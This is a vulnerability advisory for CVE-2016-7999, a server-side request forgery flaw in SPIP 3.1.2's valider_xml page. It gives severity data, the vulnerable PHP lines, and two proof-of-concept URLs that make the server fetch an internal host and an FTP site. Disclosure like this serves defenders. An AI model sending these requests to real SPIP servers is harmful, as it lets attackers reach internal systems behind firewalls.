Subject: CVE-2016-7999: SPIP 3.1.2 Server Side Request Forgery

## SPIP 3.1.2 Server Side Request Forgery (CVE-2016-7999)

### Product Description

SPIP is a publishing system for the Internet, which put importance on collaborative working, multilingual environments and ease of use. It is free software, distributed under the GNU/GPL licence.

### Vulnerability Description

It's possible to send HTTP/FTP requests using the `valider_xml` file.
Attackers can make it look like the server is sending the request, possibly bypassing access controls such as a firewall that would prevent the attacker from accessing the URLs directly.

**Access Vector**: remote

**Security Risk**: medium

**Vulnerability**: CWE-918

**CVSS Base Score**: 5.5 (Medium)

**CVE-ID**: CVE-2016-7999

### Proof of Concept

    http://spip-dev.srv/ecrire/?exec=valider_xml&var_url=http://router-dev.srv/
    http://spip-dev.srv/ecrire/?exec=valider_xml&var_url=ftp://ftp.debian.org/


### Vulnerable code

The FTP connection is initialized by the `is_dir` function inside `valider_xml`, line 79 :

    if (is_dir($url)) {

Other PHP Wrappers supporting `is_dir` can be called using this function.

The HTTP connection is initiated at line 123:

    $res = $transformer_xml(recuperer_page($url));
